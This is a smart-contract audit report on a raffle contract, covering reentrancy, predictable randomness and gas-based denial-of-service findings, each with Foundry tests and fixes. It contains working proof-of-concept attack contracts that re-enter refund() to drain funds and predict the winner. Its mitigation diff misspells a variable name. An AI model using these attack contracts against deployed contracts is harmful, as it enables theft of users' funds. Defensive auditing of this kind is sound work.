[H-1] Reentrancy in `refund()` allows malicious users to drain the contracts funds

**Description**
The function `refund()` does not follow the check effects interactions pattern. It refunds the player, and then removes the player from the `players` array. This allows malicious users to enter a smart contract that reenters the refund function on the receive callback, allowing them to drain the funds of the contract.

**Impact**
This allows malicious users to completely drain the contract of funds.

**Proof of Concept**
To prove this issue, I have written a test to be added to the `test/PuppyRaffleTest.t.sol` file, this test includes a `ReentrancyAttack` contract. To run these tests add the following to the test file:

```javascript
    function testReenterRefund() public{
        vm.startPrank(vm.addr(1));
        vm.deal(vm.addr(1), entranceFee);

        address[] memory players = new address[](1);
        players[0] = vm.addr(1);
        puppyRaffle.enterRaffle{value:entranceFee}(players);
        vm.stopPrank();

        vm.startPrank(vm.addr(10));
        vm.deal(vm.addr(10), entranceFee);

        ReentrancyAttack reentrancyAttack = new ReentrancyAttack(address(puppyRaffle));
        players[0] = address(reentrancyAttack);
        puppyRaffle.enterRaffle{value:entranceFee}(players);

        vm.expectRevert();
        reentrancyAttack.refund(1); // Refund attack should revert
    }
```

Additionally, add the `ReentrnacyAttack` contract to the test file, outside of the main test contract.

```javascript
contract ReentrancyAttack{
    PuppyRaffle puppyRaffle;
    uint256 playerIndex;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
    }

    function refund(uint256 _playerIndex) public{
        playerIndex=_playerIndex;
        puppyRaffle.refund(playerIndex);
    }

    fallback() external payable{ 
        if(address(puppyRaffle).balance > 0) {// assumes balance is in increments of entrance fee.
            puppyRaffle.refund(playerIndex);        
        }
    }
}
```

If the test fails, the refund loop will not revert, meaning the `PuppyRaffle` contract will be drained of funds, the test can be ran using:

```bash
forge test --match-test testReenterRefund 
```

Upon running this rest, we are met with a failing test with the following logs:

```
Failing tests:
Encountered 1 failing test in test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[FAIL. Reason: call did not revert as expected] testReenterRefund() (gas: 274792)
```

**Recommended Mitigation**
To solve this issue I reccomend you modify the refund function to follow the checks, effects, interactions (CEI) pattern. Here we ensure that our effects, in this case, removing the player from the players array, happens before our interactions, in this case the call to send the players entrance fee back to them.

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerindex] = address(0);

        payable(msg.sender).sendValue(entranceFee);

-       players[playerindex] = address(0);

        emit RaffleRefunded(playerAddress);
    }
```

Once these changes are made you can rerun the added test from the PoC, which should now pass:

```bash
forge test --match-test testReenterRefund 
```

Logs:
```
Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[PASS] testReenterRefund() (gas: 265271)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.11ms (450.22µs CPU time)
```

[H-2] Weak randomness in `selectWinner()` is exploitable

**Description**
The contract uses randomness based on predictable elements to select the winner, and the rarity of the winners NFT. Malicious users can exploit this to predict whether they will win or not, and choose whether to call `selectWinner()` based on this.

**Impact**
This allows users to force a win by only calling `selectWinner()` when they are certain they will win.

**Proof of Concept**
The following can be placed into the `test/PuppyRaffelTest.t.sol` file.

First, a contract to act as our attacker. The contract must be a ERC721Receiver as the Puppy Raffle uses safeMint:
```
interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract ExploitRandomness is IERC721Receiver{
    PuppyRaffle puppyRaffle;

    constructor(address _puppyRaffle){
        puppyRaffle = PuppyRaffle(_puppyRaffle);
    }

    fallback() external payable{}

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        return this.onERC721Received.selector;
    }


    function attack() public{
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 5; 

        require(puppyRaffle.players(winnerIndex) == address(this), "You wont win");
        puppyRaffle.selectWinner();
    }
}
```
Next, the test:

```
    function testExploitRandomness() public playersEntered{
        vm.startPrank(vm.addr(10));
        vm.deal(vm.addr(10), entranceFee);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number);

        ExploitRandomness exploitRandomness = new ExploitRandomness(address(puppyRaffle));
        address[] memory maliciousPlayer = new address[](1);
        maliciousPlayer[0] = address(exploitRandomness);
        puppyRaffle.enterRaffle{value:entranceFee}(maliciousPlayer);

        bool success = false;
        uint256 attempt = 0;
        while(!success){
            try exploitRandomness.attack() {
                success = true;
                break;
            } catch{
                if(attempt > 100) break;
                attempt++;
                vm.roll(block.number+attempt);
                vm.warp(block.timestamp+attempt);
                vm.prevrandao(keccak256(abi.encodePacked(block.number)));
            }
        }

        assertEq(puppyRaffle.previousWinner(), address(0), "User was able to exploit randomness!");
    }
```

The test can be ran using `forge test --match-test testExploitRandomness`.

Which results in
```
Failing tests:
Encountered 1 failing test in test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[FAIL. Reason: assertion failed] testExploitRandomness() (gas: 513354)
```

**Recommended Mitigation**
To mitigate this issue, we need to change the way we handle randomness. Instead of relying on on chain data, we should use an oracle such as [Chainlink VRF](https://docs.chain.link/vrf).

[M-1] Nested loop inside `enterRaffle()` create a DoS vulnerability

**Description**
There is a nested for loop inside `enterRaffle()` which is used to check for duplicate addresses within the `players` array, due to excessive gas build up when the players array is large, the functionality to enter the raffle can be denied. 

```javascript
        // Check for duplicates
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Impact**
This allows a malicious wealthy user to enter the raffle with many addresses, increasing the cost of entering the raffle to all whom wish to enter after them, effectively denying access to the `enterRaffle()` function and greatly increasing if not guaranteeing the malicious user wins the raffle.

**Proof of Concept**
We can utilize the `PuppyRaffle` test suite to create a proof of concept for this issue. We will add a test which enters the raffle 100 times, caches the gas used, and then enters another 100 times and compares the end gas usage to the start gas usage. Place the following inside `test/PuppyRaffleTest.t.sol`:

```javascript
    function testEnterRaffleDos() public{
        vm.prank(address(1));
        vm.deal(address(1), 10000 ether);
        vm.txGasPrice(1);

        uint count = 100;
        address[] memory players = new address[](count);

        for(uint i = 0; i < count; i++){
            players[i]=(address(i));
        }

        uint gasStart = gasleft();

        puppyRaffle.enterRaffle{value:count*puppyRaffle.entranceFee()}(players);

        uint gasEnd = gasleft();

        uint gasUsedFirst = (gasStart-gasEnd)* tx.gasprice;

        console.log("First Gas: ", gasUsedFirst);

        for(uint i = 0; i < count; i++){
            players[i]=(address(i+count));
        }

        uint gasStartSecond = gasleft();

        puppyRaffle.enterRaffle{value:count*puppyRaffle.entranceFee()}(players);

        uint gasEndSecond = gasleft();

        uint gasUsedSecond = (gasStartSecond-gasEndSecond)* tx.gasprice;

        console.log("Second Gas: ",gasUsedSecond);
    }
```

Note: Due to the nature of this attack, no test success criteria is set, we will instead rely on console logs to verify the vulnerabilities legitimacy

Now that the test is inside the test suite, it can be ran using:

```bash
forge test --match-test testEnterRaffleDos -vvv
```

Within the `Logs` section of the output, we see the following:

```
Logs:
  First Gas:  6250668
  Second Gas:  18068372
```

As you can see, the gas after the second 100 players has been added is dramatically higher then the first 100 players. Meaning that the gas cost will increase dramatically as more players enter the contest, either legitimately or illegitimately.

**Recommended Mitigation**
There are two potential mitigations I think you should consider:

1.
You may consider removing the check for duplicates, and removing the invariant that you can have an address enter the raffle multiple times. This is because if a user wants to enter the raffle multiple times, they can just create multiple addresses anyway. Also, in the docs you acknowledge this:

```
1. Call the enterRaffle function with the following parameters:
    i. address[] participants: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
2. Duplicate addresses are not allowed
```

You mention that you can enter yourself multiple times but also that duplicate addresses are not allowed, which seems like a contradiction. If you choose to go with this mitigation you can safely remove the nested for loop checking for duplicates from `enterRaffle()`.

2.
If you wish to keep the duplicate address check functionality, you may consider switching from a `players` array to a `playerAddress=>playerId` mapping, this would allow you to only loop through the `newPlayers` array parameter for `enterRaffle()` and check whether that player is in the raffle in constant time.
